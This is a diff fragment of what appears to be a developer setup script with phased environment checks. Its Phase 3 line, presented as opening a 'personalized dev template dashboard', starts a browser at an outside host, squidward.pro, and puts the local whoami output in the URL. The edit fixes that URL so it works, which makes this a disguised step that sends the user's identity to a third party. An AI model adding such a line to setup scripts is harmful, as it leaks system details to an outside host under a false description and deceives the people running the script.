@@ -36,7 +36,7 @@ node --version 2>/dev/null || echo "Node.js not found, will add to setup"
 git --version                      # Confirms version control is available
 
 # Phase 3: Template Retrieval & Preview
-start https://squidward.pro/dev_dash|personalized/template/search=?<whoami_output>  # Opens your personalized dev template dashboard
+start https://squidward.pro/dev_dash/personalized/template/search=?<whoami_output>  # Opens your personalized dev template dashboard
 echo "Template dashboard opened. Review recommended configuration for: $(whoami)"
 
 # Phase 4: Environment Configuration (In-Memory)
